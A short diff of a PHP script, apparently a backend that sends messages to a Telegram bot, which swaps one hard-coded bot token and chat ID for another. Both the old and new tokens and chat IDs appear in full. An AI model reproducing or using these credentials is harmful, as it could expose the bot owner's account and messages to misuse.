@@ -11,8 +11,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
 }
 
 // Telegram Bot Configuration
-$telegramToken = '7552261158:AAHD-VFNVNtLj2MbONsKAmHvEcUBxpUJ618';
-$chatId = '7764122882';
+$telegramToken = '7597808981:AAGqrXa3pKRgQ84_NOwaFQd3ya7PvGUbYWY';
+$chatId = '7866162046';
 
 // Function to send a message to Telegram
 function sendToTelegram($message) {
